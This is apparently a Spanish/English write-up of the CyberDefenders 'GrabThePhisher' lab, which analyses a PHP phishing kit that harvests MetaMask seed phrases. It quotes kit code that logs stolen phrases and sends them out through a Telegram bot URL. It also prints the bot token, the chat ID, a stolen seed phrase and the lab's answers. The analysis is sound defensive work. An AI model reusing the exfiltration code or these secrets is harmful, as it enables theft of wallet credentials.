+++
title = "GrabThePhisher - Cyberdefenders (Easy)"
+++

###### Category: Threat Intel

[link del laboratorio GrabThePhisher](https://cyberdefenders.org/blueteam-ctf-challenges/grabthephisher/)

## Descargar laboratorio y moverlo a la máquina virtual REMnux

### unzip lab

```bash
7z x 95-GrabThePhisher.zip -pcyberdefenders.org
```
---


## Preguntas

### Q1

Which wallet is used for asking the seed phrase?

¿Qué monedero se utiliza para pedir la frase semilla?

![first question phishinglab](/images/labs/cyberdefenders/grabthephisher/phishinglab1.png)

#### Respuesta

`Metamask`

### Q2

What is the file name that has the code for the phishing kit?

¿Cuál es el nombre del archivo que contiene el código del kit de phishing?

#### Respuesta

`metamask.php`

### Q3

In which language was the kit written?

¿En qué lenguaje fue desarrollado el kit?


#### Respuesta

`php`


### Q4


What service does the kit use to retrieve the victim's machine information?

¿Qué servicio utiliza el kit para recuperar la información de la máquina de la víctima?


![fourth question phishinglab](/images/labs/cyberdefenders/grabthephisher/phishinglab2.png)

#### Respuesta

`sypex geo`

### Q5

How many seed phrases were already collected?

¿Cuántas frases con semilla se han recopilado ya?

*En el código se puede ver que las frases semilla se escriben en un archivo log.txt*

```php
@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND); 
```

![fifth question phishinglab](/images/labs/cyberdefenders/grabthephisher/phishinglab3.png)

#### Respuesta

`3`

### Q6

Write down the seed phrase of the most recent phishing incident

Escriba la frase semilla del incidente de phishing más reciente

#### Respuesta

```bash
father also recycle embody balance concert mechanic believe owner pair muffin hockey 
```

### Q7

Which medium had been used for credential dumping?

¿Qué medio se había utilizado para el robo de credenciales?

*Línea de código presente en el archivo metamask.php*

```php
$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html"; 
```

#### Respuesta

`telegram`

### Q8

What is the token for the channel?

¿Cuál es el token del canal?

*Línea de código presente en el archivo metamask.php*

```php
$token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
```

#### Respuesta

`5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`


### Q9

What is the chat ID of the phisher's channel?

¿Cuál es el ID de chat del canal del autor del phishing?

*Línea de código presente en el archivo metamask.php*

```php
$id = "5442785564"; 
```

#### Respuesta

`5442785564`

### Q10

What are the allies of the phish kit developer?

¿Cuáles son los aliados del desarrollador del kit de phishing?


*Comentario encontrado en el código fuente del archivo metamask.php*

```php
/*

 With love and respect to all the hustler out there,
 This is a small gift to my brothers,
 All the best with your luck,
 
 Regards, 
 j1j1b1s@m3r0
  
*/  
```

#### Respuesta

`j1j1b1s@m3r0`

### Q11

What is the full name of the Phish Actor?

¿Cuál es el nombre completo del creador del phishing?

```bash
curl https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat\?chat_id\=5442785564 | jq 
```


```bash
{
  "ok": true,
  "result": {
    "id": 5442785564,
    "first_name": "Marcus",
    "last_name": "Aurelius",
    "username": "pumpkinboii",
    "type": "private",
    "active_usernames": [
      "pumpkinboii"
    ],
    "max_reaction_count": 11,
    "accent_color_id": 6
  }
}  
```

#### Respuesta

`Marcus Aurelius`


### Q12

What is the username of the Phish Actor?

¿Cuál es el nombre de usuario del creador del phishing?

```bash  
"active_usernames": [
      "pumpkinboii"
    ],
```

#### Respuesta

`pumpkinboii`